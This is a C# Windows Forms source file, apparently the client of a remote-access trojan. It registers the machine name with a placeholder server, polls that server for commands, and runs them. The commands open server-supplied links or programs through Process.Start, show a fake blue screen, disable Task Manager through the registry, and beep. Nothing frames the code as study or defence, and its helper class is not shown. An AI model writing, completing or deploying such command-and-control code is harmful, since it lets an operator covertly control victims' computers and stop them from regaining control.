using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MySql.Data.MySqlClient;
using System.Text.RegularExpressions;
using System.Diagnostics;

namespace WindowsFormsApplication2
{
    public partial class Form1 : Form
    {
        Source source = new Source(YOUR_SERVER_URL_HERE);
        String nomMachine = Environment.MachineName;
        DateTime Now = DateTime.Now;

        public Form1()
        {
            InitializeComponent();

        }

        void Form1_Load(object sender, System.EventArgs e)
        {
            source.tjrsEnLigne(nomMachine);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            String codeSource = source.afficherSource("/requete.php?nom=" + nomMachine);
            String[] commandes;
            Regex myRegex = new Regex(",");
            commandes = myRegex.Split(codeSource);

            if (codeSource != "")
            {
                switch (commandes[0])
                {
                    case "ouvrirLien":
                        Process.Start(commandes[1]);
                        source.ouvrirPage("/deletecommande.php?nom=" + nomMachine + "&type=ouvrirLien&param1=" + commandes[1]);
                        break;

                    case "afficherBSOD":
                        source.ecranBleu();
                        source.ouvrirPage("/deletecommande.php?nom=" + nomMachine + "&type=afficherBSOD");
                        break;

                    case "desactReg":
                        source.desactiverTaskMgr();
                        break;

                    case "actReg":
                        source.activerTaskMgr();
                        break;

                    case "bip":
                        source.bip();
                        break;
                }
           }
        }

        private void timerOnline_Tick(object sender, EventArgs e)
        {
            source.tjrsEnLigne(nomMachine);
        }








    }
}
